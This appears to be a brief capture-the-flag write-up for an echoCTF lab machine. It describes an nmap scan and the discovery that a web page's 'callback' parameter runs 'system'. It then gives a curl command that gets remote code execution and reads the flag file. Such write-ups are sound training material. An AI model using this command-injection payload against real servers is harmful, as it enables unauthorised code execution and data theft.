Started with a nmap scan
```
80
```
is the webserver when we go to the site it gives us some code looking at it we can with a GET request to `/?callback=system` took be a little bit to find it was `system` and with this curl command we can do RCE
`curl http://10.0.14.30/?callback=system --data=test=cat echoctf.php` and we go the flag 